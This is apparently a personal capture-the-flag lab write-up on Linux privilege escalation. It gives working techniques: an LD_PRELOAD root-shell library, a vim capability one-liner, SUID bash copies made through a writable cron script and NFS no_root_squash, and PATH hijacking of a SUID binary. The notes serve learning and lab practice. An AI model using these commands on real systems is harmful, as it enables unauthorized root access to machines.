# System Info & Kernel
Kernel of the system that you have access, could be vulnerable to kernel exploits like **Dirty COW (CVE-2016-5195)**. So it's always recommended to have a look at information about kernel. Following commands give you some information about system including kernel that is in use:
```bash
uname -a 
cat /proc/version
cat /etc/issue
```

# Sudo
The user who you get when you accessed machine, can be in sudo group. By looking which commands the user can execute with sudo privileges could be beneficial.
```bash
sudo -l
```

![[Pasted image 20220722182150.png]]

# Users 
In order to discover users you can try following command:
```bash
cat /etc/passwd | grep -v "/usr/sbin/nologin\|/bin/false\|/bin/sync\|/var/lib/libuuid"
```

This command just prints all users in system and filter them by looking invalid shells like **nologin** of **false**.

### Output
![[Pasted image 20220722184659.png]]

# Networking & Pivoting 
The machine you accessed, can be a pivoting point to another network, so it's always good to take a look at network interfaces that your target's in.

![[Pasted image 20220722184904.png]]

You can also check ip routing rules via `ip route` command.
![[Pasted image 20220722185007.png]]

### netstat
* `netstat -a` : Shows all **LISTENING** ports and **ESTABLISHED** connections.
* `netstat -at` : Shows all **TCP** activity.
* `netstat -au` : Shows all **UDP** activity.
* `netstat -l` : List ports that are in **LISTENING** mode.
* `netstat -p` : List processes with program name
* `netstart -i` : Lists interface statistics.

**Common Usage:** `netstat -anop`
* `a` : Display all sockets.
* `n` : Do not resolve names.
* `o` : Display timers
* `p` : List processes with program name.

# Find
It's a built-in linux command to help you find files and directories that you wish. For example command below finds files that is executable by current user. It starts from current directory and search for recursively.
```bash
find . -executable -type f
```

You can use **find** to find SUID files.

# Automation 
There are pretty cool bash scripts that checks for privilege escalate vectors for you. In **/opt/PrivEsc** directory you can find all of them.
* **linux-exploit-suggester.sh**: For finding CVEs
* **lse.sh**: For general privesc vectors (TIP: look for not **none** or **skip** results)

![[Pasted image 20220722193248.png]]

# LD_PRELOAD
You might see `env_keep+= LD_PRELOAD` option when you run `sudo -l` . This option allows you to specify a shared library for a C executable. Let's see how we can use it to escalate privileges.

Let's say there is a binary file which is obtained from a C source file that contains **rand()** function. And name of this file is **binary**.
If we see such an output when we enter `sudo -l`:

![[Pasted image 20220722235744.png]]

Then this means, we can create our own shared file for this binary, and in this file we can specify another **rand()** function that'll be executed when user executes binary file. 

### Example
Code below spawns a shell with root's privileges. Name of the file is **shell.c**.
```C
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

After creating this file, we need to create a **shared object file**, so we can use it with C binaries like built-in find command!
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

This command give us a **shell.so** file. And we're going to use this file when executing C binaries. After execution completed, we'll become root. That's how we should specify this file when we're executing C binaries:
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

# SUID & GUID
**SUID** and **GUID** come into play when you need to execute a file that only a user who have more privileges than you, can execute. But in order to change your current user as this more-privileged user, you're executing that file with rights of more-privileged user. For instance by setting SUID to a file as root, any user **can run this file as root** without having root privileges. And it's the same for GUID, but it checks for group of user who set the GUID. So if user who is trying to execute the file is not in GUID group, then it'd fail.

### Let's look at SUID files on system:
![[Pasted image 20220723003252.png]]

### Same for GUID:
![[Pasted image 20220723003127.png]]

Another example, let's say you changes your password with **passwd** command and you are a low-privileged user. How did you write your new password's hash into **/etc/shadow** file which is a file that only can be accessed by root ? You did that via SUID in **/bin/passwd**. Since it has SUID of root, you can execute this file as root and change contents of **/etc/shadow**.

![[Pasted image 20220723004021.png]]

# Capabilities 
Capability is like a permission that you give to a file or binary, so that file doesn't need a higher privileged user to do that thing anymore. Let's say you want to use a tool that'd initiate a socket connection. Since that can only be done by root, you wouldn't make it. However if you give this **capability** to file, then you don't need higher-privileged user to make it work.

We can use `getcap`  to list capabilities of a file.
```bash
getcap -r / 2>/dev/null
```

![[Pasted image 20220723024554.png]]

### Exploiting the Capability
```bash
/home/karen/vim -c ":python3 import os;import pty;os.setuid(0);pty.spawn('/bin/bash')"
```

Entered code above in shell, then I received another shell where UID of user is set to 0 (root).

![[Pasted image 20220723025858.png]]

### Cronjobs
Cronjobs are used to run scripts at specific times. Idea is simple, if we can find a cronjob that runs tasks with root privilege, then we can try to exploit that cronjob. Every user has a crontab which is a table contains cronjobs, however you can see **all cronjobs** via entering following command:
```bash
cat /etc/crontab
```

![[Pasted image 20220723031003.png]]

# CTF Question
I accessed machine and entered `cat /etc/crontab` to check all crontabs. All of them were running scripts as root!

![[Pasted image 20220723154714.png]]

I checked all of cronjob files and found out that only 3rd one exists. We have enough privileges to change the file. 

![[Pasted image 20220723154942.png]]
It's very important to **change file as executable** after making changes, otherwise cronjob would not execute script.

I changed file as shown below:
```bash
cp /bin/bash /tmp/shell
chmod +xs /tmp/shell
```

After waiting for less than a minute I saw shell file under **/tmp.** And executed it with **-p** parameter. If you don't specify -p here, it just gives you regular shell with privileges of your current user.

![[Pasted image 20220723155248.png]]

# PATH
In home directory of user mardoch, I found a file which has root SUID. 

![[Pasted image 20220723193600.png]]

It's a binary file and source of this binary file also in same directory which is **thm.py**.
![[Pasted image 20220723193703.png]]

It's trying to run **thm** command in shell, however there is no such a command:
![[Pasted image 20220723193743.png]]

But we can create a file named thm, which reads flag for us, since test binary runs as root. Steps will be following of creating this file:
* Find writable path: `find / -type d -writable 2> /dev/null`
* Create script then make it executable: `echo "cat pathofflag.txt" > /tmp/thm; chmod +x /tpm/thm; export PATH=/tmp:$PATH`
* Run **test** binary: `./test`

### One liner
```bash
echo "cat /home/matt/flag6.txt" > /tmp/thm; chmod +x /tmp/thm; export PATH=/tmp:$PATH; /home/murdoch/test
```

![[Pasted image 20220723195328.png]]

# NFS
### `Q1:` How many mountable shares can you identify on the target system?
![[Pasted image 20220723201125.png]]
### `A1:` 3
---
### `Q2:` How many shares have the "no_root_squash" option enabled?
NFS (Network File Share) configuration file is in **/etc/exports**.

![[Pasted image 20220723201330.png]]
### `A2:` 3
---
### PrivEsc
By default NFS changes remote root user as **nfsnobody** which is a low-privileged user. This prevents remote root user to create malicious files into shared filesystem. However if **no_root_squash** is enabled on a share, remote user is not changed as nfsnobody, so he can create privesc vectors in shared filesystem like SUID files.

#### Mount
Mount command is used to **attach an external device** into a location in the filesystem, so users can interact with that device an perform operations. 

![[subdirectorymount.png]]

Since **no_root_sqaush** is enabled on all NFS shares. 

![[Pasted image 20220724194855.png]]
We can mount one of this share with read & write permissions via this command:
```bash
sudo mount -o rw 10.10.249.95:/tmp mountPoint/
```

Now we can copy **/bin/bash** into that directory *(shell file)* , set root SUID on it. And make it work with executing following command on target:
```bash
./shell -p
```